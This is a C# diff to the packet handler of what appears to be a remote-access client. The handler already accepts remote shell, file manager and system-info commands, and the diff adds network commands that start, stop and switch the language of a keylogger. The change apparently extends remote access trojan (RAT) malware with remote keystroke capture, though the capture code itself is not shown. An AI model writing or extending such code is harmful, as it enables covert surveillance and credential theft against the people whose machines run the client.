@@ -10,12 +10,18 @@ namespace Client.Networking
         private readonly Action<SystemInfoRequest> _onSystemInfoRequest;
         private readonly Action<RemoteShellRequest> _onRemoteShellRequest;
         private readonly Action<FileManagerRequest> _onFileManagerRequest;
+        private readonly Action<KeyLoggerStart>? _onKeyLoggerStart;
+        private readonly Action<KeyLoggerStop>? _onKeyLoggerStop;
+        private readonly Action<KeyLoggerLangToggle>? _onKeyLoggerLangToggle;
 
-        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, Action<RemoteShellRequest> onRemoteShellRequest, Action<FileManagerRequest> onFileManagerRequest)
+        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, Action<RemoteShellRequest> onRemoteShellRequest, Action<FileManagerRequest> onFileManagerRequest, Action<KeyLoggerStart>? onKeyLoggerStart = null, Action<KeyLoggerStop>? onKeyLoggerStop = null, Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null)
         {
             _onSystemInfoRequest = onSystemInfoRequest;
             _onRemoteShellRequest = onRemoteShellRequest;
             _onFileManagerRequest = onFileManagerRequest;
+            _onKeyLoggerStart = onKeyLoggerStart;
+            _onKeyLoggerStop = onKeyLoggerStop;
+            _onKeyLoggerLangToggle = onKeyLoggerLangToggle;
         }
 
         public void HandleLine(string json)
@@ -47,6 +53,30 @@ namespace Client.Networking
                         if(fileReq != null)
                         {
                             _onFileManagerRequest(fileReq);
+                        }
+                        break;
+
+                    case PacketType.KeyLoggerStart:
+                        var klStart = JsonHelper.Deserialize<KeyLoggerStart>(json);
+                        if (klStart != null && _onKeyLoggerStart != null)
+                        {
+                            _onKeyLoggerStart(klStart);
+                        }
+                        break;
+
+                    case PacketType.KeyLoggerStop:
+                        var klStop = JsonHelper.Deserialize<KeyLoggerStop>(json);
+                        if (klStop != null && _onKeyLoggerStop != null)
+                        {
+                            _onKeyLoggerStop(klStop);
+                        }
+                        break;
+
+                    case PacketType.KeyLoggerLangToggle:
+                        var klLang = JsonHelper.Deserialize<KeyLoggerLangToggle>(json);
+                        if (klLang != null && _onKeyLoggerLangToggle != null)
+                        {
+                            _onKeyLoggerLangToggle(klLang);
                         }
                         break;
 
